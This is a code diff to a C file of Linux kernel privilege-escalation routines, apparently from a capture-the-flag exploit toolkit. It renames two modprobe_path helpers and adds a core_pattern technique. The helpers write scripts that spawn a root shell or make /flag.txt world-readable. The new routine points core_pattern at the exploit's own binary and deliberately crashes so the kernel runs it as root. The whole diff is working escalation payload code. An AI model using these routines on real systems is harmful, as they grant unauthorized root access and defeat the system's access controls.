@@ -3,7 +3,7 @@
 #include <stdlib.h>
 #include <sys/socket.h>
 
-void shell_modprobe(void) {
+void privesc_modprobe(void) {
     system("echo '#!/bin/sh' > /tmp/x; \
             echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
     system("chmod +x /tmp/x");
@@ -15,7 +15,7 @@ void shell_modprobe(void) {
 // based on:
 // https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch
 // required since kernel v6.14-rc1
-void shell_modprobe_socket(void) {
+void privesc_modprobe_socket(void) {
     system("echo '#!/bin/sh\nchmod 777 /flag.txt' > /s");
     system("chmod 777 /s");
 
@@ -26,4 +26,18 @@ void shell_modprobe_socket(void) {
     }
 
     system("cat /flag.txt");
+}
+
+void privesc_core_pattern(char *addr) {
+
+    // /proc/sys/kernel/core_pattern controls how the kernel handles
+    // core dumps after a crash. If core_pattern starts with a pipe
+    // (|), then the kernel executes that program as root and pipes
+    // the crashing process’s memory to it.
+    //
+    // %P expands to PID of crashing process => kernel executes our
+    // exploit with root privileges
+    strcpy(addr, "|/proc/%P/exe %P");
+    // trigger segfault causing creation of a core dump
+    *(volatile int *)0 = 0;
 }
